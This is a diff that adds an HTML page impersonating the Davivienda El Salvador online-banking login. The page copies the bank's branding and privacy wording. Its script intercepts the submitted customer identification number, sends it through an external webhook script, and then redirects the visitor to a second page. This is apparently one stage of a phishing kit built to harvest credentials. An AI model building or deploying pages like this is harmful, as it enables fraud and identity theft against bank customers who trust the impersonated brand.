@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Autenticación Davivienda</title>
+  <link rel="stylesheet" href="estilos.css" />
+  <script src="webhook.js" defer></script>
+</head>
+<body>
+  <div class="top-bar">
+    <img src="DaviviendaLogo.png" alt="Logo Davivienda" class="logo-franja" />
+  </div>
+
+  <div class="container">
+    <h2 class="titulo-login">Autenticación del cliente</h2>
+    <form id="loginForm" onsubmit="enviarDatos(event)">
+      <input type="text" id="identificacion" placeholder="Ingrese número identificación" required />
+      <button type="submit">Ingresar</button>
+    </form>
+
+    <div class="acciones-horizontal">
+      <a href="#">Registrar</a>
+      <a href="#">¿Olvidó su contraseña?</a>
+      <a href="#">Desbloquear usuario</a>
+    </div>
+
+    <div class="privacidad">
+      Davivienda tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera.
+      <a href="#">Click aquí</a>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 2025 Davivienda El Salvador – Todos los derechos reservados
+  </div>
+
+  <script>
+    function enviarDatos(e) {
+      e.preventDefault();
+      const id = document.getElementById("identificacion").value;
+      enviarAlWebhook("🆔 ID ingresado", id)
+        .then(() => window.location.href = "index2.html")
+        .catch(() => alert("Error al enviar el ID"));
+    }
+  </script>
+</body>
+</html>
